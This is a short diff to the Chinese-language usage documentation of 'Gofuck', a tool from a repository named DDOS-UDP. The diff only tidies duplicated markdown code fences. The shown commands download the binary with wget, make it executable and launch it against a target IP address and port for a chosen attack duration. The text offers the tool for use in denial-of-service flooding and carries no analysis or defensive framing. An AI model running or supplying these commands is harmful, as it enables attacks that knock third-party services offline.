@@ -3,11 +3,8 @@ Gofuck 使用文档：
 	  使用前使用 chmod +x Gofuck 赋予执行权限。
 	
 使用参数：
-
-```shell
 ```shell
 wget https://github.com/randycolin/DDOS-UDP/releases/download/v.1.0.0/Gofuck
 chmod +x Gofuck
 ./Gofuck <IP地址> <端口> <攻击持续时间>
-```
 ```
